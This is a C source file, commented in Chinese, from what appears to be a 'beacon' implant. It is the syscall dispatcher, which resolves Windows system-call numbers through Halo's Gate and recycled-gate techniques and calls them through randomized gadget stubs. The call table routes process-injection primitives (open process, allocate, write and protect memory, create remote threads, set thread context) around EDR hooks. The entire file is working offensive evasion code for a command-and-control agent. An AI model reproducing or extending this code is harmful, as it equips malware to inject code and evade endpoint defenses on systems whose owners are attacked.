#include "beacon_syscall.h"

/*
 * syscall.c -- syscall 层 Dispatcher。
 *
 * 职责：链组装、SSN 缓存、逐 API 回退、绑定 Win32Api 表、provider 清理。
 * SSN 解析与调用方式见 docs/SYSCALL_PLAN.md §4-§8。
 *
 * 阶段 1 范围：默认链只有 native（无 gate provider），全部 API 解析失败后
 * 保持原 ntdll 导出地址，行为与未接入 syscall 层完全一致（零行为变化）。
 * invoke 层为 randomized（gadget 池不满 64 时同样回退 native）。
 */

/* stubs_x64.asm 的直接 syscall stub 从这里读 SSN（调用时读取，不硬编码进指令流）。
 * 偏移 = func_id * 4，布局必须与 beacon_syscall.h 的枚举一致。 */
UINT32 g_syscall_ssn_table[SYSCALL_NT_COUNT];

/* DJB2（seed 0x1505，与参考实现一致） */
static UINT32 SyscallHashName(const CHAR* s)
{
    UINT32 h = 0x1505u;

    while (*s) {
        h = ((h << 5) + h) ^ (unsigned char)*s++;
    }
    return h;
}

/* ===== API 描述表 =====
 * 一张表同时驱动：枚举 → 函数名（provider 解析）→ Win32Api 槽位（绑定）。
 * 新增 API：枚举加一项 + 这里加一行（api_slot_offset 为 0 表示暂不绑定）。 */
const SyscallApiDesc g_syscall_apis[] = {
    { SYSCALL_NT_ALLOCATE_VIRTUAL_MEMORY, "NtAllocateVirtualMemory",
      offsetof(Win32Api, pfnNtAllocateVirtualMemory) },
    { SYSCALL_NT_PROTECT_VIRTUAL_MEMORY, "NtProtectVirtualMemory",
      offsetof(Win32Api, pfnNtProtectVirtualMemory) },
    { SYSCALL_NT_WRITE_VIRTUAL_MEMORY, "NtWriteVirtualMemory",
      offsetof(Win32Api, pfnNtWriteVirtualMemory) },
    { SYSCALL_NT_READ_VIRTUAL_MEMORY, "NtReadVirtualMemory", 0 },
    { SYSCALL_NT_OPEN_PROCESS, "NtOpenProcess",
      offsetof(Win32Api, pfnNtOpenProcess) },
    { SYSCALL_NT_CREATE_THREAD_EX, "NtCreateThreadEx",
      offsetof(Win32Api, pfnNtCreateThreadEx) },
    { SYSCALL_NT_WAIT_FOR_SINGLE_OBJECT, "NtWaitForSingleObject", 0 },
    { SYSCALL_NT_RESUME_THREAD, "NtResumeThread",
      offsetof(Win32Api, pfnNtResumeThread) },
    { SYSCALL_NT_GET_CONTEXT_THREAD, "NtGetContextThread", 0 },
    { SYSCALL_NT_SET_CONTEXT_THREAD, "NtSetContextThread", 0 },
};

/* 默认链：recycled_gate -> halos_gate -> native。native 永远在末尾兜底。 */
static INT BuildDefaultChain(SyscallManager* sm)
{
    INT n = 0;

    sm->chain[n++] = &g_syscall_provider_recycled_gate;
    sm->chain[n++] = &g_syscall_provider_halos_gate;
    sm->chain[n++] = &g_syscall_provider_native;
    return n;
}

BOOL SyscallInit(SyscallManager* sm)
{
    UINT32 i;

    if (!sm) return FALSE;

    ZeroMemory(sm, sizeof(*sm));
    sm->chain_len = BuildDefaultChain(sm);
    sm->invoke = &g_syscall_invoke_randomized;

    /* provider 链初始化（gate_common 构建 ntdll 导出缓存等），失败不影响骨架 */
    for (i = 0; i < (UINT32)sm->chain_len; i++) {
        if (sm->chain[i]->Init) {
            sm->chain[i]->Init();
        }
    }

    /* invoke 层初始化（randomized：扫描 ntdll 构建 gadget 池），失败不影响骨架 */
    if (sm->invoke->Init) {
        sm->invoke->Init();
    }

    for (i = 0; i < SYSCALL_NT_COUNT; i++) {
        sm->name_hash[i] = SyscallHashName(g_syscall_apis[i].name);
        sm->provider_of[i] = SYSCALL_PROVIDER_NONE;
        g_syscall_ssn_table[i] = 0;
    }

    /* eager 解析：失败静默降级（callable 置 NULL，槽位保持原 ntdll 地址）。
     * 逐 API 打印解析结果（Debug 构建可见，DebugView 排查用）。 */
    for (i = 0; i < SYSCALL_NT_COUNT; i++) {
        SyscallResolve(sm, i);
        DebugPrintf("[syscall] resolve %-32s -> %s (SSN %lu)\n",
                    g_syscall_apis[i].name,
                    sm->provider_of[i] == SYSCALL_PROVIDER_NONE
                        ? "native (fallback)"
                        : sm->chain[sm->provider_of[i]]->name,
                    (ULONG)sm->ssn[i]);
    }
    return TRUE;
}

BOOL SyscallResolve(SyscallManager* sm, UINT32 func_id)
{
    INT i;

    if (!sm || func_id >= SYSCALL_NT_COUNT) return FALSE;
    if (sm->provider_of[func_id] != SYSCALL_PROVIDER_NONE) return TRUE;

    for (i = 0; i < sm->chain_len; i++) {
        UINT32 ssn = 0;

        if (sm->chain[i]->ResolveNumber(func_id, &ssn)) {
            sm->ssn[func_id] = ssn;
            sm->provider_of[func_id] = (UINT8)i;
            g_syscall_ssn_table[func_id] = ssn;
            if (sm->invoke && sm->invoke->GetCallable) {
                sm->callable[func_id] = sm->invoke->GetCallable(func_id, ssn);
            }
            return TRUE;
        }
    }

    /* 全链失败：回退 native，callable 置空，绑定阶段保持槽位原样 */
    sm->provider_of[func_id] = SYSCALL_PROVIDER_NONE;
    sm->callable[func_id] = NULL;
    g_syscall_ssn_table[func_id] = 0;
    return FALSE;
}

/* 统计当前绑定槽位数（调试/测试用） */
static UINT32 SyscallBoundCount(const SyscallManager* sm);

VOID SyscallBindApiTable(SyscallManager* sm, Win32Api* api)
{
    UINT32 i;

    if (!sm || !api) return;

    /* 首次绑定：保存槽位原值（ntdll 导出地址），供 SyscallSetEnabled(FALSE) 恢复。
     * 重复绑定幂等：已保存过的不再覆盖 original。 */
    if (!sm->bound) {
        for (i = 0; i < SYSCALL_NT_COUNT; i++) {
            if (g_syscall_apis[i].api_slot_offset != 0) {
                sm->original[i] = *(PVOID*)((PBYTE)api + g_syscall_apis[i].api_slot_offset);
            }
        }
    }

    for (i = 0; i < SYSCALL_NT_COUNT; i++) {
        if (g_syscall_apis[i].api_slot_offset != 0 && sm->callable[i]) {
            *(PVOID*)((PBYTE)api + g_syscall_apis[i].api_slot_offset) = sm->callable[i];
            if (!sm->bound) {
                DebugPrintf("[syscall] bound %s -> %p (SSN %lu, provider %s)\n",
                            g_syscall_apis[i].name, sm->callable[i],
                            (ULONG)sm->ssn[i], sm->chain[sm->provider_of[i]]->name);
            }
        }
    }
    sm->bound = TRUE;
}

/* 运行时开关：覆盖/恢复 Win32Api 槽位，不触碰解析结果（ssn/callable 保持缓存）。 */
VOID SyscallSetEnabled(SyscallManager* sm, Win32Api* api, BOOL enabled)
{
    UINT32 i;

    if (!sm || !api) return;

    if (enabled) {
        if (sm->bound) return;           /* 已启用，幂等 */
        SyscallBindApiTable(sm, api);
        DebugPrintf("[syscall] enabled: %u slots bound to randomized stubs\n",
                    SyscallBoundCount(sm));
    } else {
        if (!sm->bound) return;          /* 已禁用，幂等 */
        for (i = 0; i < SYSCALL_NT_COUNT; i++) {
            if (g_syscall_apis[i].api_slot_offset != 0 && sm->original[i]) {
                *(PVOID*)((PBYTE)api + g_syscall_apis[i].api_slot_offset) = sm->original[i];
            }
        }
        sm->bound = FALSE;
        DebugPrintf("[syscall] disabled: slots restored to native addresses\n");
    }
}

/* 统计当前绑定槽位数（调试/测试用） */
static UINT32 SyscallBoundCount(const SyscallManager* sm)
{
    UINT32 i;
    UINT32 n = 0;

    if (!sm) return 0;
    for (i = 0; i < SYSCALL_NT_COUNT; i++) {
        if (g_syscall_apis[i].api_slot_offset != 0 && sm->callable[i]) {
            ++n;
        }
    }
    return n;
}

VOID SyscallCleanup(SyscallManager* sm)
{
    INT i;

    if (!sm) return;

    for (i = 0; i < sm->chain_len; i++) {
        if (sm->chain[i]->Cleanup) {
            sm->chain[i]->Cleanup();
        }
    }
    ZeroMemory(sm, sizeof(*sm));
}

#ifdef BEACON_TEST
/* ===== 测试挂钩 ===== */

VOID SyscallTestSetChain(SyscallManager* sm, const SyscallProviderOps* const* chain, INT len)
{
    UINT32 i;

    if (!sm || !chain || len <= 0 || len > SYSCALL_PROVIDER_MAX) return;
    for (i = 0; i < (UINT32)len; i++) {
        sm->chain[i] = chain[i];
    }
    sm->chain_len = len;

    /* 替换链后清空已解析状态：下次 SyscallResolve 用新链重新解析 */
    for (i = 0; i < SYSCALL_NT_COUNT; i++) {
        sm->provider_of[i] = SYSCALL_PROVIDER_NONE;
        sm->ssn[i] = 0;
        sm->callable[i] = NULL;
        g_syscall_ssn_table[i] = 0;
    }
}

VOID SyscallTestResolveAll(SyscallManager* sm)
{
    UINT32 i;

    if (!sm) return;
    for (i = 0; i < SYSCALL_NT_COUNT; i++) {
        SyscallResolve(sm, i);
    }
}

VOID SyscallTestSetInvoke(SyscallManager* sm, const SyscallInvokeOps* invoke)
{
    if (!sm) return;
    sm->invoke = invoke ? invoke : &g_syscall_invoke_randomized;
}

VOID SyscallTestResetChain(SyscallManager* sm)
{
    UINT32 i;

    if (!sm) return;
    sm->chain_len = BuildDefaultChain(sm);
    sm->invoke = &g_syscall_invoke_randomized;
    for (i = 0; i < SYSCALL_NT_COUNT; i++) {
        sm->provider_of[i] = SYSCALL_PROVIDER_NONE;
        sm->callable[i] = NULL;
        sm->ssn[i] = 0;
        g_syscall_ssn_table[i] = 0;
    }
}

UINT32 SyscallTestGetSsn(const SyscallManager* sm, UINT32 func_id)
{
    if (!sm || func_id >= SYSCALL_NT_COUNT) return 0;
    return sm->ssn[func_id];
}

PVOID SyscallTestGetCallable(const SyscallManager* sm, UINT32 func_id)
{
    if (!sm || func_id >= SYSCALL_NT_COUNT) return NULL;
    return sm->callable[func_id];
}

UINT8 SyscallTestGetProviderOf(const SyscallManager* sm, UINT32 func_id)
{
    if (!sm || func_id >= SYSCALL_NT_COUNT) return SYSCALL_PROVIDER_NONE;
    return sm->provider_of[func_id];
}
#endif
